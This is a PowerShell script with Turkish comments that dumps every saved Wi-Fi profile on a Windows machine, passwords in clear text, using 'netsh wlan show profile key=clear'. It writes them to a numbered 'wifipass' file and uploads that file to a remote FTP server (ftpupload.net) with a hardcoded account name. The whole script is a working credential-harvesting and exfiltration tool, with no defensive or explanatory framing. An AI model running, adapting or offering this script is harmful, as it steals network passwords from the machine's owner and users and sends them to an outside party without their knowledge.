# FTP bilgileri
$ftpHost = "ftp://ftpupload.net/htdocs/"   # Buraya dikkat, sonuna "htdocs/" eklendi
$ftpUser = "if0_39536575"
$ftpPass = $env:FTP_PASS

if (-not $ftpPass) {
    Write-Error "FTP_PASS ortam değişkeni ayarlı değil!"
    exit 1
}

try {
    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpHost)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)

    $response = $ftpRequest.GetResponse()
    $reader = New-Object System.IO.StreamReader $response.GetResponseStream()
    $fileList = @()
    while (-not $reader.EndOfStream) {
        $fileList += $reader.ReadLine()
    }
    $reader.Close()
    $response.Close()

    Write-Host "FTP htdocs Dosya Listesi:"
    $fileList | ForEach-Object { Write-Host " - $_" }

    $existingFiles = $fileList | Where-Object { $_ -match '^wifipass(\d*)\.txt$' }

    Write-Host "`nBulunan wifipass dosyaları:"
    $existingFiles | ForEach-Object { Write-Host " * $_" }

    $numbers = $existingFiles | ForEach-Object {
        if ($_ -match '^wifipass(\d+)\.txt$') {
            [int]$matches[1]
        } elseif ($_ -eq "wifipass.txt") {
            1
        } else {
            0
        }
    }

    $maxNum = if ($numbers.Count -gt 0) { ($numbers | Measure-Object -Maximum).Maximum } else { 0 }

    $newFileName = if ($maxNum -eq 0) { "wifipass.txt" } else { "wifipass$($maxNum + 1).txt" }

    Write-Host "`nYeni dosya adı: $newFileName"

    # Wi-Fi şifrelerini dosyaya yaz
    $localFilePath = "$env:USERPROFILE\$newFileName"
    netsh wlan show profile name="*" key=clear > $localFilePath

    # FTP'ye yükleme URL'si (htdocs içine)
    $ftpUploadUrl = $ftpHost + $newFileName

    $webclient = New-Object System.Net.WebClient
    $webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)

    $webclient.UploadFile($ftpUploadUrl, "STOR", $localFilePath)
    Write-Host "$newFileName dosyası FTP htdocs klasörüne başarıyla yüklendi."

} catch {
    Write-Error "FTP işlemi sırasında hata oluştu: $_"
}
